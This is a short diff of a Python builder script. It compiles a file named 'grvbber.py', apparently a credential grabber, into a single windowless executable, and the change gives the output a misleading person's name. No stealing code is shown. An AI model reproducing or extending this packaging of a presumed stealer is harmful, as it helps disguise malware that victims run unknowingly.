@@ -115,7 +115,7 @@ window.mainloop()
 
 print('Turning into an exe')
 os.system('pip install -r requirements.txt')
-os.system('pyinstaller --onefile --noconsole --i NONE grvbber.py')
+os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py')
 
 try:
     os.startfile('dist')
